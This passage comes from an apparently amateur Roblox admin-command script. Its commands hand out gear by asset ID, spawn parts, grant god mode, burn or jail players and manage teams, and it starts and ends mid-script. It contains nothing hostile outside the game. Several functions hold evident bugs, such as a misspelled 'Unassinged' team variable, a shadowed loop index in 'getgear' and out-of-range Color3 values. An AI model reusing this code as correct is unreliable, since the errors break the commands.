local insert = game:GetService("InsertService"):LoadAsset(57257488)
insert:MakeJoints()
insert["Jail"].Parent = player[i].Backpack
insert:remove()
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("teletool", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(msg:sub(10),speaker)
if player ~= 0 then
for i = 1,#player do
local insert = game:GetService("InsertService"):LoadAsset(57252442)
insert:MakeJoints()
insert["Teleport"].Parent = player[i].Backpack
insert:remove()
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("combatarm", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(msg:sub(11),speaker)
if player ~= 0 then
for i = 1,#player do
local insert = game:GetService("InsertService"):LoadAsset(58534404)
insert:MakeJoints()
insert["CArm"].Parent = player[i].Backpack
insert:remove()
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("eye", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(msg:sub(5),speaker)
if player ~= 0 then
for i = 1,#player do
local insert = game:GetService("InsertService"):LoadAsset(56973803)
insert:MakeJoints()
insert["Tool"].Parent = player[i].Backpack
insert:remove()
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("cig", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(msg:sub(5),speaker)
if player ~= 0 then
for i = 1,#player do
local insert = game:GetService("InsertService"):LoadAsset(57815904)
insert:MakeJoints()
insert["smoke"].Parent = player[i].Backpack
insert:remove()
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("poke", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(msg:sub(6),speaker)
if player ~= 0 then
for i = 1,#player do
local insert = game:GetService("InsertService"):LoadAsset(54395369)
insert:MakeJoints()
insert["Pokeball"].Parent = player[i].Backpack
insert:remove()
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("reapp", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(string.sub(msg,7),speaker)
if player ~= 0 then
for i = 1,#player do
player[i].CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId="..player[i].userId
player[i].Character.Humanoid.Health = 0
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("godpowers", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(msg:sub(11),speaker)
if player ~= 0 then
for i = 1,#player do
local insert = game:GetService("InsertService"):LoadAsset(57264678)
insert:MakeJoints()
insert["God Power"].Parent = player[i].Backpack
insert:remove()
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("jet", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(msg:sub(5),speaker)
if player ~= 0 then
for i = 1,#player do
local insert = game:GetService("InsertService"):LoadAsset(54778025)
insert:MakeJoints()
insert["JetPack"].Parent = player[i].Backpack
insert:remove()
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("del", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(msg:sub(5),speaker)
if player ~= 0 then
for i = 1,#player do
local insert = game:GetService("InsertService"):LoadAsset(56851690)
insert:MakeJoints()
insert["Del Tool"].Parent = player[i].Backpack
insert:remove()
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("telekin", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(msg:sub(9),speaker)
if player ~= 0 then
for i = 1,#player do
local insert = game:GetService("InsertService"):LoadAsset(56565452)
insert:MakeJoints()
insert["Telekinesis"].Parent = player[i].Backpack
insert:remove()
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("freezeray", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(msg:sub(11),speaker)
if player ~= 0 then
for i = 1,#player do
local insert = game:GetService("InsertService"):LoadAsset(58187334)
insert:MakeJoints()
insert["FreezeRay"].Parent = player[i].Backpack
insert:remove()
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("flyda", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(msg:sub(7),speaker)
if player ~= 0 then
for i = 1,#player do
local insert = game:GetService("InsertService"):LoadAsset(56579645)
insert:MakeJoints()
insert["SkyElixir"].Parent = player[i].Backpack
insert:remove()
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("flytool", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(msg:sub(9),speaker)
if player ~= 0 then
for i = 1,#player do
local insert = game:GetService("InsertService"):LoadAsset(56932215)
insert:MakeJoints()
insert["Fly"].Parent = player[i].Backpack
insert:remove()
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("gravgun", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(msg:sub(9),speaker)
if player ~= 0 then
for i = 1,#player do
local insert = game:GetService("InsertService"):LoadAsset(58369782)
insert:MakeJoints()
insert["GravityGun"].Parent = player[i].Backpack
insert:remove()
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("path", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(msg:sub(6),speaker)
if player ~= 0 then
for i = 1,#player do
local insert = game:GetService("InsertService"):LoadAsset(57067114)
insert:MakeJoints()
insert["Path"].Parent = player[i].Backpack
insert:remove()
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("assassin", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(msg:sub(10),speaker)
if player ~= 0 then
for i = 1,#player do
local insert = game:GetService("InsertService"):LoadAsset(56838840)
insert:MakeJoints()
insert["Assassin"].Parent = player[i].Backpack
insert:remove()
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("bkatana", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(msg:sub(10),speaker)
if player ~= 0 then
for i = 1,#player do
local insert = game:GetService("InsertService"):LoadAsset(56838840)
insert:MakeJoints()
insert["BlackKatana"].Parent = player[i].Backpack
insert:remove()
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("playerorb", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(msg:sub(11),speaker)
if player ~= 0 then
for i = 1,#player do
local insert = game:GetService("InsertService"):LoadAsset(56861257)
insert:MakeJoints()
insert["Start"].Parent = player[i].Backpack
insert:remove()
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("clean", 5, function(msg, MessageSplit, speaker, Self)
local imgettingtiredofmakingthisstupidscript = PERSON299(speaker.Name)
if imgettingtiredofmakingthisstupidscript == true then
local g = game:GetService("InsertService"):LoadAsset(57735410) 
g.Parent = game.Workspace
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("duckz", 5, function(msg, MessageSplit, speaker, Self)
local imgettingtiredofmakingthisstupidscript = PERSON299(speaker.Name)
if imgettingtiredofmakingthisstupidscript == true then
local g = game:GetService("InsertService"):LoadAsset(56831153) 
g.Parent = game.Workspace
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("let it snow", 5, function(msg, MessageSplit, speaker, Self)
local imgettingtiredofmakingthisstupidscript = PERSON299(speaker.Name)
if imgettingtiredofmakingthisstupidscript == true then
local g = game:GetService("InsertService"):LoadAsset(58162707) 
g.Parent = game.Workspace
g.Name = ":3"
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("stop", 5, function(msg, MessageSplit, speaker, Self)
local imgettingtiredofmakingthisstupidscript = PERSON299(speaker.Name)
if imgettingtiredofmakingthisstupidscript == true then
local c = game.Workspace:GetChildren()
for i =1,#c do
if c[i].Name == ":3" then
if c[i] ~= nil then
c[i]:Remove()
end 
end 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("takeover1", 5, function(msg, MessageSplit, speaker, Self)
local imgettingtiredofmakingthisstupidscript = PERSON299(speaker.Name)
if imgettingtiredofmakingthisstupidscript == true then
local g = game:GetService("InsertService"):LoadAsset(56865027) 
g.Parent = game.Workspace
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("antiplayerorb", 5, function(msg, MessageSplit, speaker, Self)
local imgettingtiredofmakingthisstupidscript = PERSON299(speaker.Name)
if imgettingtiredofmakingthisstupidscript == true then 
local g = game:GetService("InsertService"):LoadAsset(58559824) 
g.Parent = game.Workspace
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("antinoobs", 5, function(msg, MessageSplit, speaker, Self)
local imgettingtiredofmakingthisstupidscript = PERSON299(speaker.Name)
if imgettingtiredofmakingthisstupidscript == true then 
local g = game:GetService("InsertService"):LoadAsset(56922240) 
g.Parent = game.Workspace
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("takeover", 5, function(msg, MessageSplit, speaker, Self)
local imgettingtiredofmakingthisstupidscript = PERSON299(speaker.Name)
if imgettingtiredofmakingthisstupidscript == true then
local g = game:GetService("InsertService"):LoadAsset(58479046) 
g.Parent = game.Workspace
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("antimob", 5, function(msg, MessageSplit, speaker, Self)
local imgettingtiredofmakingthisstupidscript = PERSON299(speaker.Name)
if imgettingtiredofmakingthisstupidscript == true then
local g = game:GetService("InsertService"):LoadAsset(58728910) 
g.Parent = game.Workspace
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("recolor", 5, function(msg, MessageSplit, speaker, Self)
game.Lighting.Ambient = Color3.new(170,170,170)
game.Lighting.TimeOfDay = 14
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("noinsert", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(msg:sub(10),speaker)
if player ~= 0 then
for i = 1,#player do
local insert = player[i].Backpack:FindFirstChild("Insert")
if insert then
insert:remove()
end
local bpinsert = player[i].Character:FindFirstChild("Insert")
if bpinsert ~= nil and bpinsert:isA("Tool") then
bpinsert:remove()
end
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("platformstand", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(msg:sub(15),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character then
player[i].Character.Humanoid.PlatformStand = true
end 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("unplatformstand", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(msg:sub(17),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character then
player[i].Character.Humanoid.PlatformStand = false
end 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("cframe1", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(msg:sub(9),speaker)
if player ~= 0 then
for i = 1,#player do
local cframe = game:GetService("InsertService"):LoadAsset(34879005)
cframe:MakeJoints()
cframe["All New Edit Cframe"].Parent = player[i].Backpack
cframe:remove()
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("cframe2", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(msg:sub(9),speaker)
if player ~= 0 then
for i = 1,#player do
local cframe = game:GetService("InsertService"):LoadAsset(35145017)
cframe:MakeJoints()
cframe["CFrame"].Parent = player[i].Backpack
cframe:remove()
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("skateboard", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(msg:sub(12),speaker)
if player ~= 0 then
for i = 1,#player do
local board = game:GetService("InsertService"):LoadAsset(34879053)
board:MakeJoints()
board["SkateTool"].Parent = player[i].Backpack
board:remove()
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("wedge", 5, function(msg, MessageSplit, speaker, Self)
local danumber1 = nil
local danumber2 = nil
for i = 7,100 do
if string.sub(msg,i,i) == ""..key then
danumber1 = i
break
elseif string.sub(msg,i,i) == "" then
break
end 
end
if danumber1 == nil then return end
for i =danumber1 + 1,danumber1 + 100 do
if string.sub(msg,i,i) == ""..key then
danumber2 = i
break
elseif string.sub(msg,i,i) == "" then
break
end 
end
if danumber2 == nil then return end
if speaker.Character ~= nil then
local head = speaker.Character:FindFirstChild("Head")
if head ~= nil then
local part = Instance.new("WedgePart")
part.Size = Vector3.new(string.sub(msg,7,danumber1 - 1),string.sub(msg,danumber1 + 1,danumber2 - 1),string.sub(msg,danumber2 + 1))
part.Position = head.Position + Vector3.new(0,part.Size.y / 2 + 5,0)
part.Name = "WedgePart"
part.Parent = game.Workspace
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("cylinder", 5, function(msg, MessageSplit, speaker, Self)
local danumber1 = nil
local danumber2 = nil
for i = 10,100 do
if string.sub(msg,i,i) == ""..key then
danumber1 = i
break
elseif string.sub(msg,i,i) == "" then
break
end 
end
if danumber1 == nil then return end
for i =danumber1 + 1,danumber1 + 100 do
if string.sub(msg,i,i) == ""..key then
danumber2 = i
break
elseif string.sub(msg,i,i) == "" then
break
end 
end
if danumber2 == nil then return end
if speaker.Character ~= nil then
local head = speaker.Character:FindFirstChild("Head")
if head ~= nil then
local part = Instance.new("Part")
part.Size = Vector3.new(string.sub(msg,10,danumber1 - 1),string.sub(msg,danumber1 + 1,danumber2 - 1),string.sub(msg,danumber2 + 1))
part.Position = head.Position + Vector3.new(0,part.Size.y / 2 + 5,0)
part.Name = "Cylinder"
local cyl = Instance.new("CylinderMesh",part)
part.Parent = game.Workspace
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("block", 5, function(msg, MessageSplit, speaker, Self)
local danumber1 = nil
local danumber2 = nil
for i = 7,100 do
if string.sub(msg,i,i) == ""..key then
danumber1 = i
break
elseif string.sub(msg,i,i) == "" then
break
end 
end
if danumber1 == nil then return end
for i =danumber1 + 1,danumber1 + 100 do
if string.sub(msg,i,i) == ""..key then
danumber2 = i
break
elseif string.sub(msg,i,i) == "" then
break
end 
end
if danumber2 == nil then return end
if speaker.Character ~= nil then
local head = speaker.Character:FindFirstChild("Head")
if head ~= nil then
local part = Instance.new("Part")
part.Size = Vector3.new(string.sub(msg,7,danumber1 - 1),string.sub(msg,danumber1 + 1,danumber2 - 1),string.sub(msg,danumber2 + 1))
part.Position = head.Position + Vector3.new(0,part.Size.y / 2 + 5,0)
part.Name = "Block"
local block = Instance.new("BlockMesh",part)
part.Parent = game.Workspace
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("plate", 5, function(msg, MessageSplit, speaker, Self)
local danumber1 = nil
local danumber2 = nil
for i = 7,100 do
if string.sub(msg,i,i) == ""..key then
danumber1 = i
break
elseif string.sub(msg,i,i) == "" then
break
end 
end
if danumber1 == nil then return end
for i =danumber1 + 1,danumber1 + 100 do
if string.sub(msg,i,i) == ""..key then
danumber2 = i
break
elseif string.sub(msg,i,i) == "" then
break
end 
end
if danumber2 == nil then return end
if speaker.Character ~= nil then
local head = speaker.Character:FindFirstChild("Head")
if head ~= nil then
local part = Instance.new("Part")
part.Size = Vector3.new(string.sub(msg,7,danumber1 - 1),string.sub(msg,danumber1 + 1,danumber2 - 1),string.sub(msg,danumber2 + 1))
part.Position = head.Position + Vector3.new(0,part.Size.y / 2 + 5,0)
part.Name = "Plate"
part.formFactor = "Plate"
part.Parent = game.Workspace
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("sphere", 5, function(msg, MessageSplit, speaker, Self)
local danumber1 = nil
local danumber2 = nil
for i = 8,100 do
if string.sub(msg,i,i) == ""..key then
danumber1 = i
break
elseif string.sub(msg,i,i) == "" then
break
end 
end
if danumber1 == nil then return end
for i =danumber1 + 1,danumber1 + 100 do
if string.sub(msg,i,i) == ""..key then
danumber2 = i
break
elseif string.sub(msg,i,i) == "" then
break
end 
end
if danumber2 == nil then return end
if speaker.Character ~= nil then
local head = speaker.Character:FindFirstChild("Head")
if head ~= nil then
local part = Instance.new("Part")
part.Size = Vector3.new(string.sub(msg,8,danumber1 - 1),string.sub(msg,danumber1 + 1,danumber2 - 1),string.sub(msg,danumber2 + 1))
part.Position = head.Position + Vector3.new(0,part.Size.y / 2 + 5,0)
part.Name = "Sphere"
part.Shape = "Ball"
part.formFactor = 1
part.Parent = game.Workspace
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("burn", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(msg:sub(6),speaker)
if player ~= 0 then
for i = 1,#player do
createscript([[
if script.Parent.Parent then
fire = Instance.new("Fire")
fire.Parent = script.Parent
fire.Name = "Burn"
fire.Color = BrickColor.Random().Color
while fire do
script.Parent.Parent.Humanoid:TakeDamage(1)
wait(.1)
end
end]], player[i].Character.Torso)
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("watch", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(msg:sub(7),speaker)
if player ~= 0 then
if #player == 1 then
for i = 1,#player do
sc = script.CamScript:clone()
sc.Parent = speaker
sc["New Subject"].Value = player[i].Character.Head
sc.Disabled = false
end 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("retools", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(msg:sub(9),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].StarterGear then 
local gear = player[i].StarterGear:GetChildren()
if #gear > 0 then 
for Num,Gear in pairs(gear) do
Gear:remove()
end 
end 
end 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("savet", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(msg:sub(7),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].StarterGear and player[i].Backpack then
if #player[i].Backpack:GetChildren() > 0 then
for num,tool in pairs(player[i].Backpack:GetChildren()) do
tool:clone().Parent = player[i].StarterGear
end 
end 
end 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("getgear", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(msg:sub(9),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].StarterGear and speaker.Backpack then
for i,v in pairs(player[i].StarterGear:GetChildren()) do
v:clone().Parent = speaker.Backpack
end 
end 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("team", 5, function(msg, MessageSplit, speaker, Self)
local slash = msg:sub(6):find(""..key)+5
if slash then 
local team = upmsg:sub(6,slash-1)
if team then
local color = upmsg:sub(slash+1)
local bcolor = BrickColor.new(color)
if bcolor == BrickColor.new("Medium stone grey") and color:lower() ~= "medium stone grey" then return end 
Team = Instance.new("Team",game:GetService("Teams"))
Team.Name = team
Team.TeamColor = bcolor
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("changeteam", 5, function(msg, MessageSplit, speaker, Self)
local slash = msg:sub(12):find(""..key)+11
if slash then 
local player = findplayer(msg:sub(12,slash-1),speaker)
if player ~= 0 then
local team = findteam(msg:sub(slash+1),speaker)
if team then
for i = 1,#player do
player[i].Neutral = false
player[i].TeamColor = team.TeamColor
end 
end 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("setupteams", 5, function(msg, MessageSplit, speaker, Self)
local Teams = game:GetService("Teams")
TeamChild = Teams:GetChildren()
if #TeamChild > 0 then
for i,v in pairs(TeamChild) do
v:remove()
end
end
local Unassinged = Instance.new("Team",Teams)
Unassigned.TeamColor = BrickColor.new("Really black")
Unassigned.Name = "Unassigned"
for i,v in pairs(game.Players:GetPlayers()) do
v.Neutral = false
v.TeamColor = BrickColor.new("Really black")
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("reteam", 5, function(msg, MessageSplit, speaker, Self)
local Teams = game:GetService("Teams")
assignTeam = {}
local team = findteam(msg:sub(8),speaker)
if team then
for i,v in pairs(game.Players:GetPlayers()) do
if v.TeamColor == team.TeamColor then
table.insert(assignTeam,v)
end
end
team:remove()
if #assignTeam > 0 then
if not Teams:FindFirstChild("Unassigned") then
Unassinged = Instance.new("Team",Teams)
Unassigned.TeamColor = BrickColor.new("Really black")
Unassigned.Name = "Unassigned"
else Unassigned = Teams.Unassigned end
for i,v in pairs(assignTeam) do
v.TeamColor = Unassigned.TeamColor
end 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("change", 5, function(msg, MessageSplit, speaker, Self)
local danumber1 = nil
local danumber2 = nil
for i = 8,100 do
if string.sub(msg,i,i) == ""..key then
danumber1 = i
break
elseif string.sub(msg,i,i) == "" then
break
end 
end
if danumber1 == nil then return end
for i =danumber1 + 1,danumber1 + 100 do
if string.sub(msg,i,i) == ""..key then
danumber2 = i
break
elseif string.sub(msg,i,i) == "" then
break
end 
end
if danumber2 == nil then return end
local player = findplayer(string.sub(msg,8,danumber1 - 1),speaker)
if player ~= 0 then
for i = 1,#player do
local ls = player[i]:FindFirstChild("leaderstats")
if ls ~= nil then
local it = nil
local itnum = 0
local c = ls:GetChildren()
for i2 = 1,#c do
if string.find(string.lower(c[i2].Name),string.sub(string.lower(msg),danumber1 + 1,danumber2 - 1)) == 1 then
it = c[i2]
itnum = itnum + 1
end 
end
if itnum == 1 then
it.Value = string.sub(msg,danumber2 + 1)
end 
end 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("ungod", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(string.sub(msg,7),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local isgod = false
local c = player[i].Character:GetChildren()
for i=1,#c do
if c[i].className == "Script" then
if c[i]:FindFirstChild("Context") then
if string.sub(c[i].Context.Value,1,41) == "script.Parent.Humanoid.MaxHealth = 999999" then
c[i]:remove()
isgod = true
end 
end 
end 
end
if isgod == true then
local c = player[i].Character:GetChildren()
for i=1,#c do
if c[i].className == "Part" then
c[i].Reflectance = 0
end
if c[i].className == "Humanoid" then
c[i].MaxHealth = 100
c[i].Health = 100
end 
if c[i].Name == "God FF" then
c[i]:remove()
end 
end 
end 
end 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("god", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(string.sub(msg,5),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
if player[i].Character:FindFirstChild("God FF") == nil then
createscript([[script.Parent.Humanoid.MaxHealth = 999999
script.Parent.Humanoid.Health = 999999
ff = Instance.new("ForceField")
ff.Name = "God FF"
ff.Parent = script.Parent
function ot(hit)
if hit.Parent ~= script.Parent then
h = hit.Parent:FindFirstChild("Humanoid")
if h ~= nil then
h.Health = 0
end
h = hit.Parent:FindFirstChild("Zombie")
if h ~= nil then
h.Health = 0
end end end
c = script.Parent:GetChildren()
for i=1,#c do
if c[i].className == "Part" then
c[i].Touched:connect(ot)
c[i].Reflectance = 1
end end]],player[i].Character)
end 
end 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("sparkles", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(string.sub(msg,10),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local torso = player[i].Character:FindFirstChild("Torso")
if torso ~= nil then
local sparkles = Instance.new("Sparkles")
sparkles.Color = Color3.new(math.random(),math.random(),math.random())
sparkles.Parent = torso
end 
end 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("unsparkles", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(string.sub(msg,12),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local torso = player[i].Character:FindFirstChild("Torso")
if torso ~= nil then
local c = torso:GetChildren()
for i2 = 1,#c do
if c[i2].className == "Sparkles" then
c[i2]:remove()
end 
end 
end 
end 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("heal", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(string.sub(msg,6),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local human = player[i].Character:FindFirstChild("Humanoid")
if human ~= nil then
human.Health = human.MaxHealth
end 
end 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("sit", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(string.sub(msg,5),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local human = player[i].Character:FindFirstChild("Humanoid")
if human ~= nil then
human.Sit = true
end 
end 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("jump", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(string.sub(msg,6),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local human = player[i].Character:FindFirstChild("Humanoid")
if human ~= nil then
human.Jump = true
end 
end 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("stand", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(string.sub(msg,7),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local human = player[i].Character:FindFirstChild("Humanoid")
if human ~= nil then
human.Sit = false
end 
end 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("jail", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(string.sub(msg,6),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local torso = player[i].Character:FindFirstChild("Torso")
if torso ~= nil then
local ack = Instance.new("Model")
ack.Name = "Jail" .. player[i].Name
icky = Instance.new("Part") icky.Size = Vector3.new(1,7.2000002861023,1) icky.CFrame = CFrame.new(-26.5, 108.400002, -1.5, 0, 0, -1, 0, 1, -0, 1, 0, -0) icky.Color = Color3.new(0.105882, 0.164706, 0.203922)  icky.Anchored = true  icky.Locked = true  icky.CanCollide = true  icky.Parent = ack  icky = Instance.new("Part") icky.Size = Vector3.new(1,7.2000002861023,1) icky.CFrame = CFrame.new(-24.5, 108.400002, -3.5, 0, 0, -1, 0, 1, -0, 1, 0, -0) icky.Color = Color3.new(0.105882, 0.164706, 0.203922)  icky.Anchored = true  icky.Locked = true  icky.CanCollide = true  icky.Parent = ack  icky = Instance.new("Part") icky.Size = Vector3.new(1,7.2000002861023,1) icky.CFrame = CFrame.new(-30.5, 108.400002, -3.5, -1, 0, -0, -0, 1, -0, -0, 0, -1) icky.Color = Color3.new(0.105882, 0.164706, 0.203922)  icky.Anchored = true  icky.Locked = true  icky.CanCollide = true  icky.Parent = ack  icky = Instance.new("Part") icky.Size = Vector3.new(1,7.2000002861023,1) icky.CFrame = CFrame.new(-28.5, 108.400002, -1.5, 0, 0, -1, 0, 1, -0, 1, 0, -0) icky.Color = Color3.new(0.105882, 0.164706, 0.203922)  icky.Anchored = true  icky.Locked = true  icky.CanCollide = true  icky.Parent = ack  icky = Instance.new("Part") icky.Size = Vector3.new(1,7.2000002861023,1) icky.CFrame = CFrame.new(-24.5, 108.400002, -5.5, 0, 0, -1, 0, 1, -0, 1, 0, -0) icky.Color = Color3.new(0.105882, 0.164706, 0.203922)  icky.Anchored = true  icky.Locked = true  icky.CanCollide = true  icky.Parent = ack  icky = Instance.new("Part") icky.Size = Vector3.new(1,7.2000002861023,1) icky.CFrame = CFrame.new(-24.5, 108.400002, -7.5, 0, 0, -1, 0, 1, -0, 1, 0, -0) icky.Color = Color3.new(0.105882, 0.164706, 0.203922)  icky.Anchored = true  icky.Locked = true  icky.CanCollide = true  icky.Parent = ack  icky = Instance.new("Part") icky.Size = Vector3.new(1,7.2000002861023,1) icky.CFrame = CFrame.new(-24.5, 108.400002, -1.5, 0, 0, -1, 0, 1, -0, 1, 0, -0) icky.Color = Color3.new(0.105882, 0.164706, 0.203922)  icky.Anchored = true  icky.Locked = true  icky.CanCollide = true  icky.Parent = ack  icky = Instance.new("Part") icky.Size = Vector3.new(1,7.2000002861023,1) icky.CFrame = CFrame.new(-30.5, 108.400002, -7.5, -1, 0, -0, -0, 1, -0, -0, 0, -1) icky.Color = Color3.new(0.105882, 0.164706, 0.203922)  icky.Anchored = true  icky.Locked = true  icky.CanCollide = true  icky.Parent = ack  icky = Instance.new("Part") icky.Size = Vector3.new(7,1.2000000476837,7) icky.CFrame = CFrame.new(-27.5, 112.599998, -4.5, 0, 0, -1, 0, 1, -0, 1, 0, -0) icky.Color = Color3.new(0.105882, 0.164706, 0.203922)  icky.Anchored = true  icky.Locked = true  icky.CanCollide = true  icky.Parent = ack  icky = Instance.new("Part") icky.Size = Vector3.new(1,7.2000002861023,1) icky.CFrame = CFrame.new(-26.5, 108.400002, -7.5, 0, 0, -1, 0, 1, -0, 1, 0, -0) icky.Color = Color3.new(0.105882, 0.164706, 0.203922)  icky.Anchored = true  icky.Locked = true  icky.CanCollide = true  icky.Parent = ack  icky = Instance.new("Part") icky.Size = Vector3.new(1,7.2000002861023,1) icky.CFrame = CFrame.new(-30.5, 108.400002, -5.5, -1, 0, -0, -0, 1, -0, -0, 0, -1) icky.Color = Color3.new(0.105882, 0.164706, 0.203922)  icky.Anchored = true  icky.Locked = true  icky.CanCollide = true  icky.Parent = ack  icky = Instance.new("Part") icky.Size = Vector3.new(1,7.2000002861023,1) icky.CFrame = CFrame.new(-30.5, 108.400002, -1.5, -1, 0, -0, -0, 1, -0, -0, 0, -1) icky.Color = Color3.new(0.105882, 0.164706, 0.203922)  icky.Anchored = true  icky.Locked = true  icky.CanCollide = true  icky.Parent = ack  icky = Instance.new("Part") icky.Size = Vector3.new(1,7.2000002861023,1) icky.CFrame = CFrame.new(-28.5, 108.400002, -7.5, 0, 0, -1, 0, 1, -0, 1, 0, -0) icky.Color = Color3.new(0.105882, 0.164706, 0.203922)  icky.Anchored = true  icky.Locked = true  icky.CanCollide = true  icky.Parent = ack 
ack.Parent = game.Workspace
ack:MoveTo(torso.Position)
end 
end 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("unjail", 5, function(msg, MessageSplit, speaker, Self)
